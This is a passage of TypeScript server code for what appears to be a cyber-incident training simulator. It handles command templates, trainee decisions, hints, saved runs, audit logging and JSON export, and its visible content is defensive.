- Check SIEM
- Alert on deletion

Step 2: Respond
- Restore logs
- Investigate`,
    },
  },
};

// Helper to get auth operator ID
async function getAuthOperatorId() {
  const token = getSessionCookie();
  if (!token) return null;

  const session = await db.query.sessions.findFirst({
    where: (fields) => eq(fields.token, token),
  });

  if (!session || new Date(session.expiresAt) < new Date()) {
    return null;
  }

  return session.operatorId;
}

// Audit log helper
async function logAuditEvent(trainingRunId: string, eventType: string, details: unknown) {
  await db.insert(auditLogs).values({
    id: crypto.randomUUID(),
    trainingRunId,
    timestamp: new Date().toISOString(),
    eventType,
    details: JSON.stringify(details),
  });
}

// Server Functions

// Generate terminal command
export const generateTerminalCommand = createServerFn({ method: "POST" })
  .validator((raw: unknown) => GenerateTerminalCommandInput.parse(raw))
  .handler(async ({ data }) => {
    const operatorId = await getAuthOperatorId();
    const sector = data.sector;
    const phase = data.phase;
    const adversaryProfile = data.adversaryProfile;

    // Check for prompt injection in inputs
    const allInputs = JSON.stringify(data);
    const injectionCheck = detectPromptInjection(allInputs);
    const auditDetails = {
      sector,
      phase,
      adversaryProfile,
      nodeId: data.nodeId,
      attackType: data.attackType,
      espionageObjective: data.espionageObjective,
      promptInjectionDetected: injectionCheck.detected,
      detectedPatterns: injectionCheck.patterns,
    };

    if (injectionCheck.detected) {
      await logAuditEvent("none", "prompt-injection-blocked", auditDetails);
      throw new Error("Potential prompt injection detected in input");
    }

    // Get template or default
    const commandOutput =
      sectorCommandTemplates[sector]?.[phase]?.[adversaryProfile] ||
      `${sector.toUpperCase()} > echo "Unknown command"
Unknown command`;

    // Scrub output for safety
    const scrubbedOutput = scrubOutput(commandOutput);

    // Log audit event
    await logAuditEvent("none", "terminal-command-generated", {
      ...auditDetails,
      scrubbingApplied: true,
    });

    return {
      command: scrubbedOutput.split("\n")[0],
      output: scrubbedOutput,
      timestamp: new Date().toISOString(),
    };
  });

// Submit decision
export const submitDecision = createServerFn({ method: "POST" })
  .validator((raw: unknown) => SubmitDecisionInput.parse(raw))
  .handler(async ({ data }) => {
    const operatorId = await getAuthOperatorId();
    if (!operatorId) {
      throw new Error("Unauthorized");
    }

    // Log decision
    await logAuditEvent(data.trainingRunId, "decision", {
      phase: data.phase,
      decision: data.decision,
    });

    // Update attempt count in training run
    await db
      .update(trainingRuns)
      .set({ attemptCount: sql`${trainingRuns.attemptCount} + 1` })
      .where(eq(trainingRuns.id, data.trainingRunId));

    return {
      success: true,
      consequence:
        data.decision === "ACT"
          ? "Containment actions initiated"
          : data.decision === "DEFER"
            ? "Monitoring continued"
            : "Attack progressed unimpeded",
    };
  });

// Get hint
export const getSimulationHint = createServerFn({ method: "POST" })
  .validator((raw: unknown) => GetHintInput.parse(raw))
  .handler(async ({ data }) => {
    const operatorId = await getAuthOperatorId();
    if (!operatorId) {
      throw new Error("Unauthorized");
    }

    const nextHintLevel = Math.min(data.currentHintLevel + 1, 3);
    const hint = sectorHints[data.sector]?.[data.phase]?.[nextHintLevel] || "No hint available";

    // Log hint delivery
    await logAuditEvent(data.trainingRunId, nextHintLevel === 3 ? "solution" : "hint", {
      phase: data.phase,
      hintLevel: nextHintLevel,
      hint,
    });

    // Update hint level in training run
    await db
      .update(trainingRuns)
      .set({ hintLevel: nextHintLevel })
      .where(eq(trainingRuns.id, data.trainingRunId));

    return {
      hintLevel: nextHintLevel,
      hint,
    };
  });

// Save enhanced training run
export const saveEnhancedTrainingRun = createServerFn({ method: "POST" })
  .validator((raw: unknown) => SaveEnhancedRunInput.parse(raw))
  .handler(async ({ data }) => {
    const operatorId = await getAuthOperatorId();
    if (!operatorId) {
      throw new Error("Unauthorized. Please log in to save training runs.");
    }

    const runId = Math.random().toString(36).substring(2, 15);

    await db.insert(trainingRuns).values({
      id: runId,
      operatorId,
      sector: data.sector,
      adversary: data.adversary,
      branch: data.branch,
      mwShed: data.mwShed,
      mttd: data.mttd,
      mttr: data.mttr,
      cost: data.cost,
      score: data.score,
      shareUrl: data.shareUrl,
      isolatedNodes: data.isolatedNodes ? JSON.stringify(data.isolatedNodes) : null,
      attackType: data.attackType,
      adversaryProfile: data.adversaryProfile,
      attackChain: data.attackChain,
      espionageObjective: data.espionageObjective,
      exfiltrationTarget: data.exfiltrationTarget,
      persistenceMethod: data.persistenceMethod,
      attemptCount: data.attemptCount,
      decisionHistory: data.decisionHistory ? JSON.stringify(data.decisionHistory) : null,
      terminalCommands: data.terminalCommands ? JSON.stringify(data.terminalCommands) : null,
      hintLevel: data.hintLevel,
      exfiltratedData: data.exfiltratedData ? JSON.stringify(data.exfiltratedData) : null,
      persistenceEstablished: data.persistenceEstablished,
      simulationState: data.simulationState ? JSON.stringify(data.simulationState) : null,
      createdAt: new Date().toISOString(),
    });

    // Log save event
    await logAuditEvent(runId, "state-change", {
      action: "training-run-saved",
    });

    return { success: true, id: runId };
  });

// Export simulation to JSON
export const exportSimulationJSON = createServerFn({ method: "POST" })
  .validator(z.object({ trainingRunId: z.string() }))
  .handler(async ({ data }) => {
    const operatorId = await getAuthOperatorId();
    if (!operatorId) {
      throw new Error("Unauthorized");
    }

    const run = await db.query.trainingRuns.findFirst({
      where: (fields) => eq(fields.id, data.trainingRunId),
    });

    if (!run) {
      throw new Error("Training run not found");
    }

    // Log export event
    await logAuditEvent(data.trainingRunId, "state-change", {
      action: "json-export",
    });

    return {
      ...run,
      isolatedNodes: run.isolatedNodes ? JSON.parse(run.isolatedNodes) : null,
      decisionHistory: run.decisionHistory ? JSON.parse(run.decisionHistory) : null,
      terminalCommands: run.terminalCommands ? JSON.parse(run.terminalCommands) : null,
      exfiltratedData: run.exfiltratedData ? JSON.parse(run.exfiltratedData) : null,
      simulationState: run.simulationState ? JSON.parse(run.simulationState) : null,
    };
  });
